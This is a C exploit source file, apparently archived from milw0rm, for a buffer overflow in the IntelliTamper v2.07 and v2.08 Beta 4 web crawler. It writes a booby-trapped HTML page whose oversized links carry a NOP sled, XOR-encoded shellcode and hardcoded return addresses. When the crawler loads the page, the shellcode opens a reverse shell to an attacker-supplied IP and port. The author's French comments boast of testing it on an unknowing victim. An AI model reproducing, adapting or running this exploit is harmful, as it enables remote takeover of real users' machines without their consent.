/********************************************************************/
/* [Crpt]  IntelliTamper v2.07/2.08 Beta 4 sploit by kralor  [Crpt] */
/********************************************************************/
/*                             NO MORE                              */
/* CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL */
/* CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL */
/* CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL */
/* CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL CONFIDENTIAL */
/********************************************************************/
/* Exploit testÃ© sur Jef_FR a son insu, ca marche bien a 100%  :)     */
/* Jef_FR pourra vous le confirmer hihi :P                          */
/* Au fait c'est universel pcq si la personne utilise la v2.08beta4 */
/* ben y'a du SEH alors le premier lien qui est fait plus petit     */
/* pour la v2.07 ca fera pas planter, ca sera pris en charge par le */
/* programme.. Bref que dire de plus... Si ce n'est qu'on peut p-e  */
/* jumper direct sans aller a un jmp ebx, en utilisant 0x00F1FFDC   */
/* j'ai remarquÃ© que sur les deux versions une fois que ca crash    */
/* (je catch l'exception meme si le prog a du SEH!) ebx pointe vers */
/* cet offset toujours le meme (~fin de notre buffer). J'ai pas     */
/* regardÃ© sur d'autres plateformes, vu que j'ai deja des ret       */
/* (jmp ebx) qui vont tres bien  :)  c'est tout les poulets, enjoy.   */
/*                                                                  */
/* P.S: Faut regarder que votre IP xorÃ© par 0x98 donne pas un bad   */
/* opcode du genre < > " \r \n ... C'est pas sorcier a coder  :)      */
/********************************************************************/
/* informations: www.coromputer.net, irc undernet #coromputer       */
/********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <winsock.h>
#pragma comment(lib, "ws2_32")
#else
#include <arpa/inet.h>
#endif

#define SIZEOF   14448                 /* IntelliTamper v2.08 Beta 4 AND v2.07
                                        * for v2.07 it isn't this size 'cause
                                        * there's a *missing* in RET_ADDR2
                                        * so it cuts the size.
                                        */

#define SCOFFSET 10000                 /* IntelliTamper v2.08 Beta 4 */
#define RET_POS  SIZEOF-4
#define RET_ADDR 0x004368C4

#define SCOFFSET2 100                  /* IntelliTamper v2.07 */
#define RET_POS2  6832
#define RET_ADDR2 0x00437224

#define u_short unsigned short
#define u_char  unsigned char
#define HOP 0xd9 /* host opcode */
#define POP 0xda /* port opcode */
#define BEGIN "<HTML><HEAD>hi</HEAD>\r\n<BODY>\r\n"
#define END   "</BODY>\r\n</HTML>"

int set_sc(char *host,unsigned long port, char *sc)
{
  unsigned long ip,p;
  unsigned int i;

  ip=inet_addr(host)^0x98989898;
  p=htons((u_short)port);
  p=p<<16;
  p+=0x0002;
  p=p^0x98989898;

for(i=0;i<strlen(sc);i++) {
  if((u_char)sc[i]==HOP&&(u_char)sc[i+1]==HOP)
    if((u_char)sc[i+2]==HOP&&(u_char)sc[i+3]==HOP) {
      memcpy(sc+i,&ip,4);
      ip=0;
      }
  if((u_char)sc[i]==POP&&(u_char)sc[i+1]==POP)
    if((u_char)sc[i+2]==POP&&(u_char)sc[i+3]==POP) {
      memcpy(sc+i,&p,4);
      p=0;
      }
  }

if(ip||p) {
  printf("error: unable to find ip/port sequence in shellc0de\n");
  return -1;
  }
  return 0;
}

void syntax(char *prog)
{
  printf("syntax: %s <file> <rshell_ip> <rshell_port>\n",prog);
  exit(0);
}

void banner(void)
{
  printf("\n\t[Crpt] IntelliTamper v2.07/2.08 Beta 4 sploit " \
         "by kralor [Crpt]\n");
  printf("\t\t  www.coromputer.net && undernet #coromputer\n\n");
  return;
}

int main(int argc, char *argv[])
{
  char buffer[SIZEOF];
  unsigned long port;
  FILE *file;
  char shellc0de[] =   /* sizeof(shellc0de+xorer) == 334 bytes */
  /* classic xorer */
  /* "\xcc" */
  "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66"
  "\xb9\x3f\x01\x80\x33\x98\x43\xe2\xfa"
  /* shellc0de */
  "\x19\x5c\x50\x98\x98\x98\x13\x74\x13\x6c\xcd\xce\xfc\x39\xa8\x98"
  "\x98\x98\x13\xd8\x94\x13\xe8\x84\x35\x13\xf0\x90\x73\x98\x13\x5d"
  "\xc6\xc5\x11\x9e\x67\xae\xf0\x16\xd6\x96\x74\x70\x35\x98\x98\x98"
  "\xf0\xab\xaa\x98\x98\xf0\xef\xeb\xaa\xc7\xcc\x67\x48\x13\x60\xcf"
  "\xf0\x41\x91\x6d\x35\x70\x0b\x98\x98\x98\xab\x51\xc9\xc9\xc9\xc9"
  "\xd9\xc9\xd9\xc9\x67\x48\x11\xde\xbc\xcf\xf0\x74\x61\x32\xf8\x70"
  "\xe1\x98\x98\x98\xf0\xd9\xd9\xd9\xd9\xf0\xda\xda\xda\xda\x13\x54"
  "\xf2\x88\xc9\x67\xee\xbc\x67\x48\xf0\xfb\xf5\xfc\x98\x11\xfe\xa8"
  "\x67\xae\xf0\xea\x66\x2b\x8e\x70\xc9\x98\x98\x98\x11\xde\x86\x1b"
  "\x74\xcc\x15\xa4\xbc\xab\x58\xab\x51\x1b\x59\x8d\x33\x7a\x65\x5e"
  "\xdc\xbc\x88\xdc\x66\xdc\xbc\xa5\x66\xdc\xbc\xa4\x13\xde\xbc\x11"
  "\xdc\xbc\xd0\x11\xdc\xbc\xd4\x11\xdc\xbc\xc8\x15\xdc\xbc\x88\xcc"
  "\xc8\xc9\xc9\xc9\xf2\x99\xc9\xc9\x67\xee\xa8\xc9\x67\xce\x86\x67"
  "\xae\xf0\x77\x56\x78\xf8\x70\x9a\x98\x98\x98\x67\x48\xcb\xcd\xce"
  "\xcf\x13\xf4\xbc\x80\x13\xdd\xa4\x13\xcc\x9d\xe0\x9b\x4d\x13\xd2"
  "\x80\x13\xc2\xb8\x9b\x45\x7b\xaa\xd1\x13\xac\x13\x9b\x6d\xab\x67"
  "\x64\xab\x58\x34\xa2\x5c\xec\x9f\x59\x57\x95\x9b\x60\x73\x6a\xa3"
  "\xe4\xbc\x8c\xed\x79\x13\xc2\xbc\x9b\x45\xfe\x13\x94\xd3\x13\xc2"
  "\x84\x9b\x45\x13\x9c\x13\x9b\x5d\x73\x9a\xab\x58\x13\x4d\xc7\xc6"
  "\xc5\xc3\x5a\x9c\x98";

  banner();

  if(argc!=4)
    syntax(argv[0]);

  port=atoi(argv[3]);
  if(port<=0||port>65535) {
    printf("error: <port> must be between 1 and 65535\r\n");
    return -1;
  }
  printf("[S] ip: %s port: %d file: %s\r\n",argv[2],port,argv[1]);
  printf("[C] Setting universal %-39s ...","shellcode");
  if(set_sc(argv[2],port,shellc0de))
    return -1;
  printf("DONE\r\n");
  file=fopen(argv[1],"w");
  if(!file) {
    printf("error: unable to open %s\r\n",argv[1]);
    return -1;
  }
  printf("[C] Writing magic link for Intellitamper %-20s ...","v2.07");
  fprintf(file,BEGIN);
  fprintf(file,"sex drugs and rock'n'roll<BR>\r\n");

  memset(buffer,0x90,sizeof(buffer));
  *(unsigned long*)&buffer[RET_POS2] = RET_ADDR2;
  memcpy(buffer+SCOFFSET2,shellc0de,sizeof(shellc0de)-1);
  memcpy(buffer+6836-8,"\xEB\xE0",2); /* jmp $ - 0x10 */
  memcpy(buffer+6836-16,"\xE9\x8F\xE5\xFF\xFF",5); /* jmp $ - ??? */

  fprintf(file,"<A HREF=\"");
  fprintf(file,buffer);
  fprintf(file,"\">sexy bitch</A><BR>\r\n");
  printf("DONE\r\n");

  printf("[C] Writing magic link for Intellitamper %-20s ...","v2.08 Beta 4");
  memset(buffer,0x90,sizeof(buffer));
  *(unsigned long*)&buffer[RET_POS] = RET_ADDR;
  memcpy(buffer+SCOFFSET,shellc0de,sizeof(shellc0de)-1);
  memcpy(buffer+SIZEOF-8,"\xEB\xE0",2); /* jmp $ - 0x10 */
  memcpy(buffer+SIZEOF-16,"\xE9\x8F\xEB\xFF\xFF",5); /* jmp $ - ??? */

  fprintf(file,"<A HREF=\"");
  fprintf(file,buffer);
  fprintf(file,"\">not sexy bitch</A><BR>\r\n");
  printf("DONE\r\n");

  fprintf(file,END);
  fclose(file);
  printf("[C] All job done\r\n");
  return 0;
}

// milw0rm.com [2008-08-13]
